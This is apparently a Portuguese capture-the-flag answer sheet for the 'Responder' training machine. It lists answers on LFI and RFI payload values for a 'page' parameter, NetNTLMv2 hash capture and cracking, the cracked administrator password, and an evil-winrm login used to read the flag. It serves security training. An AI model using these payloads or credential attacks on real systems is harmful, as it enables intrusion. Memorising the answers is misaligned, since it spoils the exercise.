# Responder.md

#### Tags
`SAMBA` `Enumeration` `Apache` `WinRM` 

## Questões

1. **Quantas portas TCP estão abertas na máquina?**
_R:_ `3`

2. **Ao visitar o serviço web usando o endereço IP, qual é o dominio para o qual estamos sendo direcionados?**
_R:_ `unika.htb`

3. **Qual a linguagem de script está sendo usada no servidor para gerar páginas da web?**
_R:_ `PHP`

4. **Qual é o nome do parâmetro de URL que é usado para carregar diferentes versões de idioma da página web?**
_R:_ `page`

5. **Qual dos seguintes valores para o parâmetro `page` seria um exemplo de exploração de uma vulnerabilidade de Inclusão de Arquivo Local (LFI): "french.html", "//10.10.14.6/somefile", "../../. ./../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
_R:_ `../../. ./../../../../../windows/system32/drivers/etc/hosts`

6. **Qual dos seguintes valores para o parâmetro `page` seria um exemplo de exploração de uma vulnerabilidade Remote File Include (RFI): "french.html", "//10.10.14.6/somefile", "../../. ./../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
_R:_ `//10.10.14.6/somefile`

7. **O que significa NTLM?**
_R:_ `new technology lan manager`

8. **Qual sinalizador usamos no utilitário responder para especificar a interface de rede?**
_R:_ `-I`

9. **Existem várias ferramentas que aceitam um desafio/resposta NetNTLMv2 e tentam milhões de senhas para ver se alguma delas gera a mesma resposta. Uma dessas ferramentas é muitas vezes referida como `john`, mas o nome completo é o que?.**
_R:_ `john the ripper`

10. **Qual é a senha do usuário administrador?**
_R:_ `badminton`

11. **Usaremos um serviço do Windows (ou seja, rodando na caixa) para acessar remotamente a máquina do Respondente usando a senha que recuperamos. Em qual porta TCP ele escuta?**
_R:_ `5985`

## **Envie a flag**
*Write-up:*
~~~shell
 evil-winrm -i 10.129.201.88 -u administrator -p badminton
 cd ../../
 cd mike
 cd Desktop
 cat flag.txt
 ∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎
 ~~~
